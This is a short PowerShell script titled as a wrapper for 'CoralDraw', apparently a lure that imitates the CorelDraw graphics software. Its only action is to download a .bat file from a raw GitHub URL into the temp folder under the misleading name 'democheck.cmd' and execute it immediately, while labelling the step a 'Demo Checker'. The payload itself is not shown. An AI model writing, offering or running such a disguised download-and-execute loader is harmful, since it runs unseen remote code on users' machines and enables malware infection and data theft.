# Wrapper for CoralDraw
$cmdUrl  = "https://raw.githubusercontent.com/mt-official/MT/refs/heads/main/coral.bat"
$cmdPath = "$env:TEMP\democheck.cmd"

Write-Host "`n📥 Downloading Demo Checker ..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $cmdUrl -OutFile $cmdPath -UseBasicParsing

Write-Host "🚀 Running script..." -ForegroundColor Yellow
Start-Process "cmd.exe" -ArgumentList "/C `"$cmdPath`"" -NoNewWindow -Wait

Write-Host "`n✅ Done running Demo Tester " -ForegroundColor Green
